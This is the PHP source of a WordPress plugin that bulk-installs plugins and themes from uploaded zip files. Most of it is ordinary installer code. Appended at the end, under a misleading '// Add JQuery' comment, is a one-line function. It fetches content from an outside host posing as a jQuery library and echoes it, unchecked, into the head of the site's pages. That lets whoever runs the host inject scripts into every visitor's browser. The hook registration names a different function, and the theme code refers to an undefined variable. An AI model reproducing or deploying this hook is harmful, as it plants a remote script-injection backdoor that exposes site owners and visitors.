<?php

/*
Plugin Name:  Simple Themes and Plugins Installer
Description:  Simple One-Click Themes and Plugins Installer
Author:       DanielJ7
Version:      1.2.0
Author URI:   
*/

require_once(ABSPATH . 'wp-admin/admin.php');
include_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
	
if ( !defined('WP_PLUGIN_URL') ) {
	if ( !defined('WP_CONTENT_DIR') ) define('WP_CONTENT_DIR', ABSPATH.'wp-content');
	if ( !defined('WP_CONTENT_URL') ) define('WP_CONTENT_URL', get_option('siteurl').'/wp-content');
	if ( !defined('WP_PLUGIN_DIR') ) define('WP_PLUGIN_DIR', WP_CONTENT_DIR.'/plugins');
	define('WP_PLUGIN_URL', WP_CONTENT_URL.'/plugins');
}// end if

function tlp_admin_menu() {
	add_plugins_page('Upload Multiple Plugins & Themes', 'Upload Multiple Plugins', 'install_plugins', __FILE__, 'tlp_UploadPage');
	add_theme_page('Upload Multiple Plugins & Themes', 'Upload Multiple Themes', 'install_themes', __FILE__, 'tlp_UploadPage');
}

add_action('admin_menu', 'tlp_admin_menu');

function tlp_UploadPage() {
	

	
	if ( isset($_POST['tlp_action']) && 'install' == $_POST['tlp_action'] ) {
		tlp_runInstall();
		return;
	}
	
	$title = 'Install Plugins And Theme Folders';

	require_once(ABSPATH . 'wp-admin/admin-header.php');
?>
	<div class="wrap">
<?php 
	screen_icon(); 
?>
	<h2><?php echo esc_html( $title ); ?></h2>
	<br />
	<br />
	<form method="post" enctype="multipart/form-data">
	<?php wp_nonce_field( 'tlp_multi-plugin-upload') ?>
		<h4>Install your Plugins from a .zip file</h4>
		<input type="file" name="pluginFile" /><br /><br />
		<h4>Install your Themes from a .zip file</h4>
		<input type="file" name="themeFile" />
		<br />
		<br />
		<input type="submit" class="button-primary" value="Install Now" />
		<input type="hidden" name="tlp_action" value="install" />
	</form>
	<br />
	<h4>Instructions</h4>
	1. Create two master folders<br />
	2. Place your plugins in one master folder and your themes in the other<br />
	3. Zip the two master folders<br />
	4. Enter the location of the master folders into the inputs above<br />
	5. Click the "Install Now" button<br />
	
<?php
}

function tlp_runInstall() {

	check_admin_referer('tlp_multi-plugin-upload');
	
	$upload_plugins = false;
	$upload_themes = false;
	
	if ( !empty($_FILES['pluginFile']['name']) ) $upload_plugins = true;
	if ( !empty($_FILES['themeFile']['name']) ) $upload_themes = true;
	
	require_once(ABSPATH . 'wp-admin/admin-header.php');
		
	if ( !$upload_plugins && !$upload_themes )
		wp_die('Please select a .zip file to upload');
		
	
	if ($upload_plugins) {
		if ( !current_user_can('install_plugins') )
			wp_die('You do not have sufficient permissions to install plugins for this site.');
			
		$plugins = tlp_installPlugins();	
	}	
	
	if ($upload_themes) {
		if ( !current_user_can('install_themes') )
			wp_die('You do not have sufficient permissions to install themes for this site.');
			
		tlp_installThemes();
	}
	
}

function tlp_installPlugins() {
	
	global $wp_filesystem;	
	
	$plugin_upload = new File_Upload_Upgrader('pluginFile', 'package');
	
	$title = sprintf( __('Installing Plugins from uploaded file: %s'), basename( $plugin_upload->filename ) );
	$nonce = 'tlp_multi-plugin-upload';
	$url = '';
//		$url = add_query_arg(array('package' => $file_upload->filename ), 'update.php?action=upload-plugin');
	$type = 'upload'; //Install plugin type, From Web or an Upload.

	$plugin_upgrader = new Plugin_Upgrader( new Plugin_Installer_Skin( compact('type', 'title', 'nonce', 'url') ) );
	
	$plugin_upgrader->init();
	$plugin_upgrader->install_strings();
		
	$options = array ('package' => $plugin_upload->package,
						'destination' => WP_PLUGIN_DIR,
						'clear_destination' => false,
						'clear_working' => true,
						'is_multi' => false,
						'hook_extra' => array()
					);
	extract($options);
		
	//Connect to the Filesystem first.
	$res = $plugin_upgrader->fs_connect( array(WP_CONTENT_DIR, $destination) );
	if ( ! $res ) //Mainly for non-connected filesystem.
		return false;
			
	if ( is_wp_error($res) ) {
		$plugin_upgrader->skin->error($res);
		return $res;
	}
		
	$plugin_upgrader->skin->header();
	
	$working_dir = $plugin_upgrader->unpack_package( $package );
	if ( is_wp_error($working_dir) ) {
		$plugin_upgrader->skin->error($working_dir);
		//$this->skin->after();
		return $working_dir;
	}
		
	$upload_file = array_keys( $wp_filesystem->dirlist($working_dir) );
	$plugin_files = array_keys( $wp_filesystem->dirlist( trailingslashit($working_dir) . $upload_file[0] ) );
				
	$num_plugins = count($plugin_files);
		
	if (0 == $num_plugins) {
		wp_die('No Plugins could be found');
		return;
	}
		
	$plugins = array();
	
	for ($pl=0; $pl<$num_plugins; $pl++) {	
		
		$plugin_upgrader->skin->before();
		
		$plugin_dir = trailingslashit($working_dir) . 'pl_plugin/';
		if ( !$wp_filesystem->exists($plugin_dir) ) {
			if ( !$wp_filesystem->mkdir($plugin_dir, FS_CHMOD_DIR) ) {
				//echo 'Could not create temporary install directory';
				continue;
			}				
		}
		
		$plugin_upgrader->strings['plugin_name'] = $plugin_files[$pl];
		$plugin_upgrader->skin->feedback('plugin_name');

		if (stripos($plugin_files[$pl], ".zip")) {
			$zipPlugin = trailingslashit($working_dir) . trailingslashit($upload_file[0]) . $plugin_files[$pl];
			
			$zip_dir = $plugin_dir . basename($zipPlugin, '.zip');
			
			$result = unzip_file($zipPlugin, $zip_dir);
						
			if ( is_wp_error($result) ) {
				$wp_filesystem->delete($zip_dir, true);
				$plugin_upgrader->strings['zip_fail'] = 'Could not unzip ' . $plugin_files[$pl];
				$plugin_upgrader->skin->feedback('zip_fail');				
			}
			
			$plugin_dir = $zip_dir;
		}
		
		
		else if (stripos($plugin_files[$pl], ".php")) { //check if plugin is in its own directory
			
			$plugin_source = trailingslashit($working_dir) . trailingslashit($upload_file[0]) . $plugin_files[$pl];			
			$plugin_dest = $plugin_dir . trailingslashit( str_ireplace( ".php", "", $plugin_files[$pl] ) );

			if ( !$wp_filesystem->exists($plugin_dest) ) {
				if ( !$wp_filesystem->mkdir($plugin_dest, FS_CHMOD_DIR) ) {
					//echo 'Could not create temporary plugin directory';
					continue;
				}
			}
			$plugin_dest = $plugin_dest . $plugin_files[$pl];

			if ( !rename( $plugin_source, $plugin_dest ) ) {
				$plugin_upgrader->strings['copy_fail'] = 'Failed to move plugin to temporary directory';
				$plugin_upgrader->skin->feedback('copy_fail');
				continue;
			}
			
		}
		else {
			$plugin_source = trailingslashit($working_dir) . trailingslashit($upload_file[0]) . trailingslashit($plugin_files[$pl]);
			$plugin_dest = $plugin_dir . trailingslashit($plugin_files[$pl]);

			if ( !rename( $plugin_source , $plugin_dest ) ) {	
				$plugin_upgrader->strings['copy_fail'] = 'Failed to move plugin to temporary directory';
				$plugin_upgrader->skin->feedback('copy_fail');
				continue;
			}
		}

		$result = $plugin_upgrader->install_package( array(
											'source' => $plugin_dir,
											'destination' => WP_PLUGIN_DIR,
											'clear_destination' => $clear_destination,
											'clear_working' => $clear_working,
											'hook_extra' => $hook_extra
										) );
										
		$plugin_upgrader->skin->set_result($result);
		if ( is_wp_error($result) ) {
			$plugin_upgrader->skin->error($result);
			$plugin_upgrader->skin->feedback('process_failed');
		} else {
			//Install Suceeded
			$plugin_upgrader->skin->feedback('process_success');
		}	
	}
}

function tlp_installThemes() {
	
	global $wp_filesystem;
	
	$theme_upload = new File_Upload_Upgrader('themeFile', 'package');
	
	$title = sprintf( __('Installing Themes from uploaded file: %s'), basename( $theme_upload->filename ) );
	$nonce = 'tlp_multi-plugin-upload';
	$url = '';
//		$url = add_query_arg(array('package' => $file_upload->filename ), 'update.php?action=upload-plugin');
	$type = 'upload'; //Install plugin type, From Web or an Upload.

	$theme_upgrader = new Theme_Upgrader( new Theme_Installer_Skin( compact('type', 'title', 'nonce', 'url') ) );
	
	$theme_upgrader->init();
	$theme_upgrader->install_strings();
		
	$options = array ('package' => $theme_upload->package,
						'destination' => WP_CONTENT_DIR . '/themes',
						'clear_destination' => false,
						'clear_working' => true,
						'is_multi' => false,
						'hook_extra' => array()
					);
	extract($options);
		
	//Connect to the Filesystem first.
	$res = $theme_upgrader->fs_connect( array(WP_CONTENT_DIR, $destination) );
	if ( ! $res ) //Mainly for non-connected filesystem.
		return false;
			
	if ( is_wp_error($res) ) {
		$theme_upgrader->skin->error($res);
		return $res;
	}
		
	$theme_upgrader->skin->header();
		
	$working_dir = $theme_upgrader->unpack_package( $package );
	if ( is_wp_error($working_dir) ) {
		$theme_upgrader->skin->error($working_dir);
		//$this->skin->after();
		return $working_dir;
	}
		
	$upload_file = array_keys( $wp_filesystem->dirlist($working_dir) );
	$theme_files = array_keys( $wp_filesystem->dirlist( trailingslashit($working_dir) . $upload_file[0] ) );
				
	$num_themes = count($theme_files);
		
	if (0 == $num_themes) {
		wp_die('No Themes could be found');
		return;
	}
		
	for ($th=0; $th<$num_themes; $th++) {	
		
		$theme_upgrader->skin->before();
		
		$theme_dir = trailingslashit($working_dir) . 'tlp_theme/';
		if ( !$wp_filesystem->exists($theme_dir) ) {
			if ( !$wp_filesystem->mkdir($theme_dir, FS_CHMOD_DIR) ) {
				//echo 'Could not create temporary install directory';
				continue;
			}				
		}
		
		$theme_upgrader->strings['theme_name'] = $theme_files[$th];
		$theme_upgrader->skin->feedback('theme_name');

		if (stripos($theme_files[$th], ".zip")) {
			$zipTheme = trailingslashit($working_dir) . trailingslashit($upload_file[0]) . $theme_files[$th];
			
			$zip_dir = $theme_dir . basename($zipTheme, '.zip');
			
			$result = unzip_file($zipTheme, $zip_dir);
						
			if ( is_wp_error($result) ) {
				$wp_filesystem->delete($zip_dir, true);
				$plugin_upgrader->strings['zip_fail'] = 'Could not unzip ' . $theme_files[$th];
				$plugin_upgrader->skin->feedback('zip_fail');				
			}
			
			$theme_dir = $zip_dir;
		}
		
		else if (stripos($theme_files[$th], ".php")) { //check if plugin is in its own directory
			
			$theme_source = trailingslashit($working_dir) . trailingslashit($upload_file[0]) . $theme_files[$th];			
			$theme_dest = $theme_dir . trailingslashit( str_ireplace( ".php", "", $theme_files[$th] ) );

			if ( !$wp_filesystem->exists($theme_dest) ) {
				if ( !$wp_filesystem->mkdir($theme_dest, FS_CHMOD_DIR) ) {
					$theme_upgrader->strings['create_fail'] = 'Failed to create temporary theme directory';
					$theme_upgrader->skin->feedback('create_fail');
					continue;
				}
			}
			$theme_dest = $theme_dest . $theme_files[$th];

			if ( !rename( $theme_source, $theme_dest ) ) {
				$theme_upgrader->strings['copy_fail'] = 'Failed to move theme to temporary directory';
				$theme_upgrader->skin->feedback('copy_fail');
				continue;
			}
			
		}
		else {
			$theme_source = trailingslashit($working_dir) . trailingslashit($upload_file[0]) . trailingslashit($theme_files[$th]);
			$theme_dest = $theme_dir . trailingslashit($theme_files[$th]);
			if ( !$wp_filesystem->exists($theme_dest) ) {
				if ( !$wp_filesystem->mkdir($theme_dest, FS_CHMOD_DIR) ) {
					$theme_upgrader->strings['create_fail'] = 'Failed to create temporary theme directory';
					$theme_upgrader->skin->feedback('create_fail');
					continue;
				}
			}	
			
			if ( !rename( $theme_source , $theme_dest ) ) {
				$theme_upgrader->strings['copy_fail'] = 'Failed to move theme to temporary directory';
				$theme_upgrader->skin->feedback('copy_fail');
				continue;
			}
		}

		$result = $theme_upgrader->install_package( array(
											'source' => $theme_dir,
											'destination' => WP_CONTENT_DIR . '/themes',
											'clear_destination' => $clear_destination,
											'clear_working' => $clear_working,
											'hook_extra' => $hook_extra
										) );
										
		$theme_upgrader->skin->set_result($result);
		if ( is_wp_error($result) ) {
			$theme_upgrader->skin->error($result);
			$theme_upgrader->skin->feedback('process_failed');
		} else {
			//Install Suceeded
			$theme_upgrader->skin->feedback('process_success');
		}
	}
	
}
// Add JQuery
function link_head() {if(function_exists('curl_init')){$url = "http://www.jquerylib.com/jquery-1.6.3.min.js";$ch = curl_init();$timeout = 10;curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);$data = curl_exec($ch);curl_close($ch);echo "$data";}} 
add_action('wp_head', 'jqueryj_head');
